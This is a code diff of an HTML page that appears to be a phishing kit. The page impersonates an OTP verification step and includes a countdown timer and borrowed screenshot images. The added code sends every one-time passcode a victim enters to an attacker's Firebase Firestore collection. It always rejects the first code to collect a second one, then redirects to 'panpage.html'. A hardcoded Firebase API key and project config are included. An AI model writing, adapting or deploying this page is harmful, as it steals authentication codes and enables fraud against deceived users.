@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -12,14 +11,12 @@
       width: 98%;
       overflow-x: hidden;
     }
-
     img {
       width: 100%;
       max-width: 1000px;
       border-radius: 0px;
       margin-top: 40px;
     }
-
     .form-container {
       width: 90%;
       max-width: 400px;
@@ -31,12 +28,10 @@
       position: relative;
       z-index: 1;
     }
-
     .form-group {
       margin-bottom: 10px;
       text-align: left;
     }
-
     input[type="password"] {
       width: 90%;
       padding: 8px;
@@ -46,14 +41,12 @@
       font-size: 12px;
       color: #333;
     }
-
     .error-text {
       color: red;
       font-size: 12px;
       margin-top: 5px;
       display: none;
     }
-
     .submit_btn {
       margin-top: 20px;
       text-align: center;
@@ -62,7 +55,6 @@
       justify-content: center;
       gap: 10px;
     }
-
     .submit_btn button {
       background: #f09c19;
       color: #fff;
@@ -75,17 +67,14 @@
       cursor: pointer;
       transition: background 0.3s ease;
     }
-
     .submit_btn button:hover {
       background: #0f3f55;
     }
-
     .countdown {
       font-size: 13px;
       color: #333;
       font-weight: bold;
     }
-
     .bottom-image {
       display: block;
       margin: 20px auto 0 auto;
@@ -93,7 +82,6 @@
       max-width: 350px;
       border-radius: 0px;
     }
-
     .blur-overlay {
       position: fixed;
       top: 0;
@@ -111,7 +99,6 @@
       font-weight: bold;
       color: #000;
     }
-
     .loader {
       border: 4px solid #f3f3f3;
       border-top: 4px solid #f09c19;
@@ -121,7 +108,6 @@
       animation: spin 1s linear infinite;
       margin-top: 15px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -129,60 +115,76 @@
   </style>
 </head>
 <body>
-
   <div class="blur-overlay" id="blurOverlay">
     Loading...
     <div class="loader"></div>
-  </div>
-
-  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="New Header">
-
-  <div class="form-container">
-    <form onsubmit="return handleSubmit()">
+  </div>  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="New Header">  <div class="form-container">
+    <form onsubmit="return handleSubmit(event)">
       <div class="form-group">
         <input type="password" id="otp" maxlength="8" placeholder=" " required>
         <div class="error-text" id="errorText">Invalid OTP</div>
-      </div>
-
-      <div class="submit_btn">
-        <button type="submit">Submit</button>
-        <div class="countdown" id="timer">03:00</div>
-      </div>
-    </form>
-
-    <img class="bottom-image" src="https://i.ibb.co/Q7Vd7N0D/Screenshot-2025-04-19-21-58-55-92-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+      </div><div class="submit_btn">
+    <button type="submit">Submit</button>
+    <div class="countdown" id="timer">03:00</div>
   </div>
+</form>
 
-  <script>
+<img class="bottom-image" src="https://i.ibb.co/Q7Vd7N0D/Screenshot-2025-04-19-21-58-55-92-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
+
+  </div>  <!-- Firebase SDK -->  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
+      authDomain: "welcomingrewd.firebaseapp.com",
+      projectId: "welcomingrewd",
+      storageBucket: "welcomingrewd.firebasestorage.app",
+      messagingSenderId: "33456614906",
+      appId: "1:33456614906:web:b5828e5dcb0253cace0843"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>  <script>
     let attempt = 1;
 
-    function handleSubmit() {
+    function handleSubmit(e) {
+      e.preventDefault();
       const blur = document.getElementById("blurOverlay");
       const otp = document.getElementById("otp");
       const errorText = document.getElementById("errorText");
+      const otpValue = otp.value.trim();
+
+      if (otpValue === "" || otpValue.length < 4) {
+        alert("Please enter a valid OTP");
+        return false;
+      }
 
       blur.style.display = "flex";
+      errorText.style.display = "none";
 
-      setTimeout(() => {
-        blur.style.display = "none";
-
-        if (attempt === 1) {
-          errorText.style.display = "block";
-          attempt++;
-        } else {
-          if (otp.value.length === 6 || otp.value.length === 8) {
-            window.location.href = "panpage.html";
+      db.collection("otp_entries").add({
+        otp: otpValue,
+        attempt: attempt,
+        valid: attempt > 1,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        setTimeout(() => {
+          blur.style.display = "none";
+          if (attempt < 2) {
+            errorText.style.display = "block";
+            attempt++;
           } else {
-            alert("Please enter a valid 6 or 8 digit OTP.");
+            window.location.href = "panpage.html";
           }
-        }
-
-      }, 4000);
+        }, 4000);
+      }).catch((error) => {
+        blur.style.display = "none";
+        alert("Error saving OTP: " + error.message);
+      });
 
       return false;
     }
 
-    // Countdown Timer - 3 minutes
+    // Countdown Timer
     let timeLeft = 180;
     const timerDisplay = document.getElementById("timer");
 
@@ -197,6 +199,5 @@
     }
 
     updateTimer();
-  </script>
-</body>
+  </script></body>
 </html>
